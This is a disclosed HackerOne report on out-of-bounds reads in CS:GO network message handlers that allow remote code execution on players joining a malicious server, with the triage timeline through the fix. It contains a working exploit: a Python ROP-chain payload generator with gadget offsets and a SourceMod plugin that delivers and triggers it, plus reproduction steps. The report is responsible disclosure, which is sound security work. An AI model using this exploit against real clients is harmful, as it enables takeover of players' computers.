---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/out-of-bounds-read
  - env/network
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "Out-of-bounds Read"
enriched: true
body: true
date: 2021-05-04
submitted: 2020-02-29T17:19:45.863Z
bounty_usd: 7500
votes: 219
cve: []
program: "[[programs/valve|Valve]]"
reporter: "slidybat"
source: "https://hackerone.com/reports/807772"
title: "OOB reads in network message handlers leads to RCE"
---
# OOB reads in network message handlers leads to RCE

> **Severity:** Critical | **Bounty:** 7,500 USD | **Votes:** 219 | **Program:** Valve | **Disclosed:** 2021-05-04

- Report: [https://hackerone.com/reports/807772](https://hackerone.com/reports/807772)
- CWE: Out-of-bounds Read
- Submitted: 2020-02-29T17:19:45.863Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Vulnerability
In Source engine games there are many network messages sent from the server to the client that take an entity index. There is a common pattern among many of these messages for the lower bounds of the entity index to be checked but not the upper bounds. In many cases these out of bound reads get an entity pointer from that index then call a virtual function on it.

As an example, here is the handler for the CS:GO [`GlowPropTurnOff`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L444-L446) message:

```cpp
bool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)
{
  CBaseEntity* entity = nullptr;

  int ent_idx = msg->ent_index;
  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )
  {
    CBaseHandle* handle = entitylist[ent_idx]
    entity = handle->GetBaseEntity();  // A virtual function
  }
  
  // ...
  
  return true;
}
```


# Exploiting the vulnerability
I will be discussing the `GlowPropTurnOff` message specifically for the remainder of this report, however this OOB read pattern exists in other messages too. I have successfully tested this on a couple of other CS:GO user messages, and while I haven't tested it I also suspect that this bug pattern exists in the network messages of other Source games as well.

This is the assembly used to access the `entitylist` array:
```asm
mov     eax, ent_idx
test    eax, eax
js      short loc_103B77A2
shl     eax, 4
mov     ecx, entitylist[eax]
```

The index is shifted left by 4 bits (`shl eax, 4`) before being used to access `entitylist`. This means that we can supply a large positive number that will overflow to a negative number, allowing us to return a pointer to pretty much anywhere in the module. Our goal will be to supply an index that returns a pointer to some memory that we control on the client. This memory will have the required vtable set up so that when `handle->GetBaseEntity()` is called it will call an address that we control.

Following a writeup of a similar bug (https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf), I chose to use the [`ShowMenu`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L417-L421) message to set up the needed memory on the client. The `ShowMenu` message takes the `menu_string` supplied from the server, converts it to UTF16, and stores it in a global string variable `wchar_t g_szMenuString[512]`.

I wrote the following Python script to generate the payload needed to send through the `ShowMenu` message to set up a fake object with a valid vtable and also includes the ROP chain needed to pop calc:
```py
from pwn import *
import textwrap

BASE_ADDRESS        = 0x287E0000
FAKE_OBJ            = BASE_ADDRESS + 0x3174F3C

SHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244

GADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1
GADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C
GADGET_POP_EAX      = BASE_ADDRESS + 0x4a925
GADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6
GADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215
GADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92
GADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279
GADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f

def to_unicode(dword):
    a = dword & 0xffff;
    b = dword >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))

def write(addr, value):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(value)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_deref(addr, to_deref):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(to_deref)
    rop += to_unicode(GADGET_MOV_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_zero(addr):
    rop = u''
    rop += to_unicode(GADGET_XOR_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def stack_pivot(addr):
    rop = u''
    rop += to_unicode(GADGET_POP_ESP)
    rop += to_unicode(addr)
    return rop

rop = ''

open_str_addr = FAKE_OBJ + 400
rop += write(open_str_addr, u32('open'))

calc_str_addr = FAKE_OBJ + 420
rop += write(calc_str_addr, u32('calc'))

# Move stack somewhere where it can safely not overwrite our fake object as functions are called
params_addr = FAKE_OBJ + 1000000
rop += write_deref(params_addr, SHELL_EXECUTE_ADDR)
rop += write(params_addr + 4, 0x41414141)
rop += write_zero(params_addr + 8)
rop += write(params_addr + 12, open_str_addr)
rop += write(params_addr + 16, calc_str_addr)
rop += write_zero(params_addr + 20)
rop += write_zero(params_addr + 24)
rop += write_zero(params_addr + 28)
rop += stack_pivot(params_addr)

# Fake object structure
#  0 - pointer to actual object (#1)
#  1 - pointer to vtable        (#2)
#  2 - pointer to `pop esp`           <-- start of vtable, and where eax will be pointing once #9 is called
#  3 - pointer to full stack    (#10) <-- This will move the stack to somewhere where we have more room 
#  4 - junk
#  5 - junk
#  6 - junk
#  7 - junk
#  8 - junk
#  9 - ptr to `xchg eax, esp`         <-- address that is initially jumped to, will set esp to #2 so we can pivot stack & begin ROP chain
# 10 - stack                          <-- where our ROP chain begins
fakeobj = u''
fakeobj += '--'
fakeobj += to_unicode(FAKE_OBJ + 4)
fakeobj += to_unicode(FAKE_OBJ + 4 * 2)
fakeobj += to_unicode(GADGET_POP_ESP)
fakeobj += to_unicode(FAKE_OBJ + 4 * 10)
fakeobj += u'\u4141\u4141'
fakeobj += u'\u4242\u4242'
fakeobj += u'\u4343\u4343'
fakeobj += u'\u4444\u4444'
fakeobj += u'\u4545\u4545'
fakeobj += to_unicode(GADGET_XCHG_EAX_ESP)
fakeobj += rop

fakeobj = fakeobj.encode('utf-8')

print(''.join(['\\x%02x' % ord(c) for c in fakeobj]))
```

*Note*: As in #470520 the script above needs to know the base address of the client's `client_panorama.dll` module in order to be 100% reliable, however it isn't possible to this due to ASLR.

Next, this payload needs to be sent to the client. I did this using the following SourceMod plugin:
```cpp
#include <sdktools>

public void OnPluginStart()
{
	HookEvent( "player_spawn", Event_PlayerSpawn );
}

public Action Event_PlayerSpawn( Event event, const char[] name, bool dontBroadcast )
{
    int client = GetClientOfUserId( event.GetInt( "userid" ) );
	
	{
		char payload[] = "PLACE PAYLOAD HERE";
	
		Protobuf msg = UserMessageToProtobuf( StartMessageOne( "ShowMenu", client ) );
		msg.SetInt( "bits_valid_slots", 0xFFFFFFFF );
		msg.SetInt( "display_time", 0 );
		msg.SetString( "menu_string", payload );
		EndMessage();
	}
	
	{
		Protobuf msg = UserMessageToProtobuf( StartMessageOne( "GlowPropTurnOff", client ) );
		msg.SetInt( "entidx", 0xfe43167 );
		EndMessage();
	}

	return Plugin_Continue;
}
```

Once a client connects the payload is set up using the `ShowMenu` message and then is triggered immediately after with the `GlowPropTurnOff` message, resulting in calc being popped.


# PoC
Here is a video showcasing the bug being triggered on CS:GO when joining a server:
{F732616}


# Reproduction steps
1) Start CS:GO and note the base address of `client_panorama.dll`
2) Replace the value of `BASE_ADDRESS` in the Python script above with this base address value and run the script
3) Copy the generated payload into the contents of the `payload` string in the SourceMod script above and compile the plugin
4) Add the compiled plugin to the server and connect to this server with the client, as soon as the client is fully connected calc will be popped automatically

## Impact

This bug allows an attacker to execute arbitrary code on the computers of any clients that join their server.

## Timeline

- **Report Filed**
- **2020-03-01** @ktistai: Hi @slidybat,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@ktistai
- **Report Needs More Info**
- **Report New**
- **2020-03-03** @h1_analyst_oceana: Hello @slidybat,

Thanks for the update! I am looking into this, and I will update you once there is more information to share.

Cheers,

@magicmouse
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report Inactive**
- **2020-07-25** @slidybat: Hi @ktistai,

I've found an infoleak that can make this bug 100% reliable. I submitted it as a separate report, you can find the details for it in #942359.

Attached is an implementation for a PoC that makes use of this infoleak. Other than chaining with the infoleak it contains almost no differences to the initial PoC in the report, but here's a video showcasing it anyways:
{F922660}

Hoping we can get this report reopened, let me know if anything else is needed.

Thanks.
- **Report Reopened**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **2020-08-06** @slidybat: Hi @ktistai.

Server is now set up. Here are the details:
IP - `139.99.199.147:27015`
Password - `2214`

To summarize the replication steps:
1) Start CS:GO and ensure that `sv_allowuploads` is set to `1`. This can be done by entering the command `sv_allowuploads 1` into the console.
2) Connect to the server listed above. Can be done by entering this into console: `connect 139.99.236.89:27015; password 2214`
3) Once fully connected `calc.exe` should be automatically popped. If not check chat messages in-game (press Y after selecting a team); the server may have failed to leak `client.dll` base address, in which case you need to go into the `csgo` folder of the game and delete `_leak.txt` and reattempt from step 1.

Should only take a few attempts at most to get working.
- **2020-08-06** @slidybat: Just noticed in step 2 above I used the wrong IP address, the original IP that was first listed is the correct one. The amended command is: `connect 139.99.199.147:27015; password 2214`
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **2020-08-13** @ktistai: Hi @slidybat

I've tried with both the map and without it on my filesystem and the. With the map copied from here, I'm getting another error that the map is not the same as the server's. 

{F947645}

When deleting both files and letting the game download them from your server, it hangs as what it looks downloading the second file (`.nav` ) as the BSP finishes loading. 

After finishing 100%, it goes back to 0: 

{F947642} 

{F947641}


and then it just hangs. I'll leave it until later, but I doubt it's a network/latency issue. 

Thanks, 
@ktistai
- **2020-08-14** @slidybat: Hi @ktistai,

Odd that you're getting an error about map not being the same, I copied it directly from the server. I also tested it myself and worked fine. Regardless, I set `sv_pure 0` on the server so that it doesn't kick you for mismatched files.

As for the hanging, I tested again and didn't encounter that. I also tested on other devices, which does make me think it is a network issue.

Since the map seems to be causing so much trouble I also decided to change to a map that is available in the default CS:GO installation (`ar_baggage`). The reason I used a custom map in the first place was that existing maps tend to have lots of assets that cause game allocations and slightly decrease the success rate of the infoleak.

Sorry for all the back and forth, you seem to be coming across a lot of issues that don't pop up for me. Hopefully this sorts them out.

Thanks.
- **Report Needs More Info**
- **Report New**
- **Report Triaged**
- **Report Severity Updated**
- **2020-11-15** @slidybat: Hi, any updates?
- **2020-11-16** @ktistai: Hi @slidybat , the report was just sent to the team that is supposed to fix it as of two weeks ago. Please be aware that for Valve fixing these issues may take time, as the releases are not so often, so the pipeline is slow.
- **2021-04-28** @slidybat: Seems this bug has been fixed in the latest beta release of CS:GO.
The usermessage handler now contains proper upper/lower bounds checks:
{F1281312}
- **Bounty Awarded**
- **Report Resolved**
- **2021-05-01** @slidybat: Hi @mcjohn,

Glad to see this report finally resolved, but can I ask why the bounty was reduced from the usual amount? The policy states that critical severity bugs for CS:GO should be about $7500.

Thanks.
- **Agreed On Going Public**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
